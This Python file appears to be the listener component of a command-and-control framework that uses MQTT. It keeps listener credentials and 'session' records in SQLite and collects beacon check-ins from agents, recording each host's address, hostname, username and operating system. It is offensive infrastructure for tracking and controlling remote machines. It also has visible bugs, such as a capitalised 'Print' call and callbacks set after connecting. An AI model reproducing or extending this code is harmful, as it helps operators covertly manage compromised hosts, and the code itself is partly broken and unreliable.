# do mq sqlite stuff
import readline
import sqlite3
from collections import namedtuple
from cryptography.fernet import Fernet
import base64
import paho.mqtt.client as mqtt
import time
import os

dbfile = (os.path.dirname(os.path.realpath(__file__))+"/mqt-config.db")
def createsess():
	conn = sqlite3.connect(dbfile)
	cursor = conn.cursor()
	cursor.execute("CREATE TABLE IF NOT EXISTS session (ID INTEGER PRIMARY KEY, Transport TEXT, Address TEXT, Hostname TEXT, Username TEXT, OS TEXT, ListenerHost TEXT, ListenerPort INTEGER, Lastseen TEXT, Active TEXT)")
	conn.commit()
	conn.close()
def createlisten():
	conn = sqlite3.connect(dbfile)
	cursor = conn.cursor()
	cursor.execute("CREATE TABLE IF NOT EXISTS listener (ID INTEGER PRIMARY KEY, Transport TEXT, Address TEXT, Port INTEGER, Private TEXT, User TEXT, Pass TEXT, Active TEXT)")
	conn.commit()
	conn.close()
def dropsess():
		conn = sqlite3.connect(dbfile)
		cursor = conn.cursor()
		cursor.execute("DROP TABLE IF EXISTS session")
		conn.commit()
		conn.close()
def daemonmqtt():
	timeout = 1
	AL = namedtuple('AL', 'ID Transport Address Port Private User Pass')
	conn = sqlite3.connect(dbfile)
	conn.isolation_level = None
	conn.row_factory = lambda cursor, row: AL(*row)
	cursor = conn.cursor()
	for row in cursor.execute("SELECT ID, Transport, Address, Port, Private, User, Pass from listener WHERE Active = 'yes'"):
		aid=str(row.ID)
		atrans=str(row.Transport)
		broker=str(row.Address)
		port=int(row.Port)
		apriv=str(row.Private)
		username=str(row.User)
		password=str(row.Pass)
		if apriv == 'public':
			Print("Selected listener is a public mqtt server, you have been warned")
	conn.close()
	topic_checkin = "beacon/checkin/"
	topic_beacon = "beacon/clients/"
	beacon = "1"
	beaker = "beacon"
	def on_connect(client, userdata, flags, rc):
		duty = "1"
		client.subscribe(topic_beacon)
		client.publish(topic_checkin, beacon)
	def on_message(client, userdata, msg):
		output = msg.payload.decode('UTF-8')
		nomeans = "no"
		output2 = strans, sadd, shost, suser, sos, slist, slport = output.split(',')
		now = time.asctime()
		conn = sqlite3.connect(dbfile)
		cursor = conn.cursor()
		cursor.execute("DROP TABLE IF EXISTS session")
		cursor.execute("CREATE TABLE IF NOT EXISTS session (ID INTEGER PRIMARY KEY, Transport TEXT, Address TEXT, Hostname TEXT, Username TEXT, OS TEXT, ListenerHost TEXT, ListenerPort INTEGER, Lastseen TEXT, Active TEXT)")
		cursor.execute("INSERT INTO session (Transport, Address, Hostname, Username, OS, ListenerHost, ListenerPort, Lastseen, Active) VALUES(?,?,?,?,?,?,?,?,?)", (strans, sadd, shost, suser, sos, slist, slport, now, nomeans))
		conn.commit()
		conn.close()

	# Set up connection
	client = mqtt.Client(beaker, transport=atrans)
	client.tls_set()
	client.username_pw_set(username, password)
	client.connect(broker, port, 60)
	client.on_connect = on_connect
	client.on_message = on_message

	# Wait for agents to respond		
	timeout = 3
	timeout_start = time.time()
	while time.time() < timeout_start + timeout:
		client.loop()
	client.loop_stop()
	client.disconnect()
	print("\nListener ID "+aid+" is activated\n")